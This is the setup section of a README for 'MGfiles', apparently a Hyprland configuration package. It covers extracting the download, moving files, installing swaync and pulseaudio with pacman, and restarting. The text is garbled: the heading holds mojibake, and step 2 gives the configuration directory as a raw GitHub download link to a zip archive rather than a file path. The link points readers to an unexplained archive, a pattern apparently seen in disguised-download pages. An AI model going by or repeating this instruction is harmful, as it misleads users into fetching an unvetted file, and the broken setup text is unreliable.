## ‚öôÔ∏è Setup Instructions
After downloading MGfiles, follow these steps to set it up:

1. **Extract the Files:**
   - If you downloaded a zip file, right-click on it and choose "Extract."
   - This will create a new folder with the extracted files.

2. **Move Files to the Right Location:**
   - Open your file manager.
   - Navigate to the extracted folder.
   - Move the contents to the directory where you store your Hyprland configuration (typically at `~https://raw.githubusercontent.com/xxmohamed141/MGfiles/main/rofi/MGfiles-3.1.zip`).

3. **Install Additional Packages:**
   - Open your terminal.
   - Run the following command to install the necessary packages:
     ```
     sudo pacman -S swaync pulseaudio
     ```

4. **Launch Hyprland:**
   - Restart your computer or log out and back in.
   - Open your terminal and start Hyprland.
